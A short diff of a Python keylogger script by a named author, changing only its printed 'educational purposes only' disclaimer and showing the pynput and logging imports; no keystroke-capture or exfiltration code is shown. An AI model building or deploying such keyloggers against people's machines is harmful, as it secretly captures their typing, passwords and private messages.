@@ -1,7 +1,7 @@
 print("""
 A Python Keylogger created by Shuvadip Ghosh
 This for Educational purposes only
-Person using it for malicious purposes will only be responsible for the consequenses
+Person using it for malicious purposes will only be responsible for the consequenses and no one else.
 """)
 from pynput.keyboard import Key, Listener
 import logging
